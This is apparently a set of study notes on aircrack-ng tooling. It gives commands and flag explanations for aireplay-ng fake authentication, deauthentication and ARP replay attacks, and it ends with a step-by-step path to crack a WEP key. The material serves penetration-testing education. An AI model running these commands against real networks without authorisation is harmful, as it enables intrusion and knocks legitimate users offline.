# Aireplay-ng Attacks

## Initial Attack Setup 

Put wireless card into monitor mode 
start airodump and write the file to disk so we can pass it later to aircrack-ng to break the WEP key. 

```
airmon-ng start mon0 6
airodump-ng -c <channel> --bssid <AP MAC> -w <filename> <interface name>
airodump-ng -c 6 --bssid 00:22:3F:B5:AF:36 -w wep1 mon0
```

## Aireplay-ng Fake Authentication Attack

Will only work on WEP not on WPA/WPA2
Associate to an access point using either of the two types of WEP authentication: the open system and shared key authentication

```
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>

or if the AP doesn't comply with that then use: 

aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```
```
-1: The fake authentication attack
0(6000): The reassociation timing in seconds
-e: The wireless network name (ESSID)
-a: The AP MAC address
-h: Your attacking MAC address
<interface>: The monitor mode interface
-o 1: Send only one set of packets at a time. The default is to send multiple sets and this confuses some APs.
-q 10: Send keep-alive packets every 10 seconds.
```

## Aireplay-ng Deauthentication Attack

The deauthentication attack, sends disassociation packets to one or more wireless clients currently associated with an access point. 

Useful for: 

Recovering a cloaked/hidden ESSID
Capturing WPA/WPA2 4-way handshakes by forcing clients to re-authenticate
Generating ARP requests (Windows clients often flush their ARP cache when disconnected)


Useless if there are no associated wireless clients.

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface name>
aireplay-ng -0 1 -a 00:22:3F:B5:AF:36 -c 50:3E:AA:3B:6F:D8 mon0
```
```
-0: deauthentication attack
1:  the number of deauths to send. 0 means to send continuously
-a: MAC address of the AP
-c: MAC address of the client to deauthenticate. if this is omitted, all clients will be deauthenticated
<interface name>: your monitor mode interface name
```

## Aireplay-ng ARP Request Replay Attack 

Effective way to generate new initialization vectors and of all the attacks Aireplay has to offer, this attack is probably the most reliable. The attack listens for an ARP packet and then retransmits it back to the access point. This, in turn, causes the AP to repeat the ARP packet with a new IV. By collecting enough of these IVs, Aircrack-ng can then be used to crack the WEP key.

ARP request sends out a query to ask their network who has a specific IP address. The clients reply with the MAC address of the related IP address. 

```
aireplay-ng -3 -b <AP MAC> -h <Source MAC> <interface name>
```

```
-3: ARP request replay attack
-b: AP MAC address
-h: source MAC address (either an associated client or your MAC from fake authentication)
<interface name>: the monitor mode interface name
```
For this attack, your wireless card needs to be in monitor mode and you will need either the MAC address of an associated client or your own MAC address after having performed a fake authentication with the AP.
After launching the ARP request replay attack, you may have to wait a couple of minutes (or even longer) until an ARP request shows up on the network. This attack will fail if there is no traffic on the network.
At this point, you are waiting for an ARP packet to appear on the network. Once one is received, the ARP request replay attack will jump into action and start replaying the packet over and over again, forcing the AP to generate new initialization vectors

The attack: 

Make sure we are associated with the AP by launching the fake authentication attack: 

```
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
aireplay-ng -1 0 -e Asus10 -a 00:22:3F:B5:AF:36 -h 00:C0:CA:82:A0:E6 mon0
```

Launch the ARP request relay attack using the attacker's wireless device mac as the source address:

```
aireplay-ng -3 -b <AP MAC> -h <Source MAC> <interface name>
aireplay-ng -3 -b 00:22:3F:B5:AF:36 -h 00:C0:CA:82:A0:E6 mon0
```

Deauthenticate a victim client as there is a high likelihood that it will send ARP packets as it reconnects 

```
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface name>
aireplay-ng -0 1 -a 00:22:3F:B5:AF:36 -c 50:3E:AA:3B:6F:D8 mon0
```


## Aircrack-ng 

Aircrack-ng is a wireless WEP and WPA/WPA2-PSK cracking program included in the Aircrack-ng suite. Aircrack-ng can recover the WEP key from a capture dump once enough encrypted packets have been captured with Airodump-ng. Aircrack-ng can use the following three methods in order to extract a WEP key:

The Pyshkin, Tews, Weinmann (PTW) approach, the main advantage of which is that very few data packets are required in order to crack the WEP key. The drawback of this method is that it requires ARP packets in order to work.
The FMS/KoreK method. The FMS/KoreK method incorporates various statistical attacks to discover the WEP key together with brute force techniques.
Lastly, Aircrack-ng offers a dictionary method for determining the WEP key. When cracking WPA/WPA2 pre-shared keys, the dictionary method is the only technique used.

```
aircrack-ng [options] <capture file(s)>
```

You can specify multiple input files in either .cap or .ivs format and in addition, you can run both Airodump-ng and Aircrack-ng at the same time. Aircrack-ng will auto-update when new IVs are available.
Running with default options will usually suffice. 

```
Option  Param
-a      amode   Force attack mode (1=static WEP, 2=WPA/WPA2-PSK)
-e      essid   If set, all IVs from the specified ESSID will be used
-b      bssid   Select the target network based on the AP MAC address
-p      nbcpu   On SMP systems, the number of CPUs to use
-q      none    Enable quiet mode
-C      macs    In WEP cracking, merge the given APs to a virtual one
-c      none    In WEP cracking, restrict the search to alpha-numeric characters
-t      none    In WEP cracking, restrict the search to binary coded decimal hex
-h      none    In WEP cracking, restrict the search to numeric characters
-d      start   Set the beginning of the WEP key in hex
-m      maddr   MAC address to filter WEP data packets
-n      nbits   Specify the length of the WEP key. 64=40-bit WEP, 128=104-bit
-i      index   Only keep IVs with the specified key index (1 to 4)
-f      fudge   By default, this is set to 2 for 104-bit WEP and 5 for 40-bit WEP
-k      korek   Specify one of the 17 korek statistical attacks
-x/-x0  none    Disable last key bytes brute force
-x1     none    Enable last key byte brute force (default)
-x2     none    Enable last two key bytes brute force
-y      none    For WEP, enable experimental single brute force attack
-u      none    Provide information on the number of CPUs and MMX support
-K      none    Use the KoreK attack instead of PTW
-s      none    Shows the key in ASCII while cracking
-M      number  Specify the maximum number of IVs to use
-D      none    WEP decloak, skips broken keystreams
-P      number  PTW debug. 1: disable Klein 2: PTW
-1      none    Run only 1 try to crack key with PTW
-w      words   Path to a word list
-r      DB path Path to the airolib-ng database
```


## Summary attack path 


Start the monitor interface
capture all the packets from the specific channel and bssid you are targeting
run a fake authentication attack 
Launch an ARP request replay attack 
Deauthenticate the client to force new IV generation 

```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
aircrack-ng <capture>
```





